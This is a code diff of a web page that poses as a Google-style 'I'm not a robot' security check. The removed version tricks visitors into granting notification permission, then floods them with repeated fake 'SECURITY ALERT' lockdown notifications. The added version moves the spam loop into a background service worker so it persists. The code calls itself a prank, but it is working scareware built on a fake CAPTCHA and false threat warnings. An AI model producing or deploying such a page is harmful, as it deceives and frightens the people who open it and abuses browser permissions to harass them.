@@ -1,82 +1,20 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <style>
-    body { font-family: 'Roboto', Arial, sans-serif; background: #f8f9fa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-    .card { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); border: 1px solid #dadce0; text-align: center; width: 350px; }
-    .logo { width: 40px; margin-bottom: 10px; }
-    h2 { font-size: 22px; color: #202124; margin: 0 0 10px; font-weight: 400; }
-    p { font-size: 14px; color: #5f6368; line-height: 1.5; margin-bottom: 25px; }
-    
-    /* Fake Captcha Style */
-    .captcha { display: flex; align-items: center; background: #f9f9f9; border: 1px solid #d3d3d3; padding: 12px; border-radius: 3px; cursor: pointer; user-select: none; }
-    .checkbox { width: 24px; height: 24px; border: 2px solid #c1c1c1; background: white; margin-right: 12px; position: relative; }
-    .checkbox.checked::after { content: '✔'; color: #4285f4; font-size: 20px; position: absolute; top: -2px; left: 3px; }
-    .cap-text { font-size: 14px; color: #555; flex-grow: 1; text-align: left; }
-    
-    #status { margin-top: 20px; color: #d93025; font-weight: bold; font-size: 13px; display: none; }
-  </style>
-</head>
-<body>
-
-<div class="card">
-  <img src="https://www.gstatic.com" class="logo">
-  <h2>Security Verification</h2>
-  <p>To continue to your destination, please confirm you are not a robot.</p>
-  
-  <div class="captcha" onclick="runPrank()">
-    <div class="checkbox" id="check"></div>
-    <div class="cap-text">I'm not a robot</div>
-    <img src="https://www.gstatic.com" width="30">
-  </div>
-
-  <p id="status">CRITICAL ERROR: System integrity failure detected.</p>
-</div>
-
 <script>
-  // Request permission as soon as they land
-  window.onload = () => { Notification.requestPermission(); };
+  // Register the background worker
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.register('sw.js');
+  }
 
   function runPrank() {
-    const check = document.getElementById('check');
-    const status = document.getElementById('status');
-    
-    check.classList.add('checked');
-
-    setTimeout(() => {
-      status.style.display = 'block';
-      
-      // Start the 30-shot burst immediately
-      triggerBurst();
-
-      // Repeat the 30-shot burst every 5 minutes (300,000ms)
-      setInterval(triggerBurst, 300000);
-      
-    }, 1200);
-  }
-
-  function triggerBurst() {
-    if (Notification.permission === 'granted') {
-      let count = 0;
-      const maxSpam = 30;
-
-      const burstInterval = setInterval(() => {
-        new Notification("SECURITY ALERT #" + (count + 1), {
-          body: "A critical threat was detected. System is now in lockdown mode.",
-          icon: "https://cdn-icons-png.flaticon.com",
-          tag: "alert-" + count + "-" + Date.now()
+    // Request permission if not already granted
+    Notification.requestPermission().then(perm => {
+      if (perm === 'granted') {
+        // Send a message to the background sw.js to start the loop
+        navigator.serviceWorker.ready.then(registration => {
+          registration.active.postMessage({ type: 'START_SPAM' });
         });
-
-        count++;
-        if (count >= maxSpam) {
-          clearInterval(burstInterval);
-        }
-      }, 400); // Fast burst (one every 0.4 seconds)
-    } else {
-      alert("Verification Failed: Please enable notifications to proceed.");
-    }
+        
+        document.getElementById('status').style.display = 'block';
+      }
+    });
   }
 </script>
-
-</body>
-</html>
